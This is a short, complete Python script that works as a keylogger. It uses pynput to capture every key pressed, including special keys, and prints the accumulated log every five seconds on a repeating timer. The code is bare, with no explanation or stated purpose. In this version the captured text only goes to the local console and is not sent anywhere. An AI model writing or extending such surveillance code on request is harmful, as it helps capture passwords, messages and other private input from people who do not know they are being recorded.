#!/usr/bin/env python
import pynput.keyboard
import threading

log = ""
def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
        # print(log)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "
            # print(log)
def report():
    global log
    print(log)
    log = ""
    Timer = threading.Timer(5, report)
    Timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    report()
    keyboard_listener.join()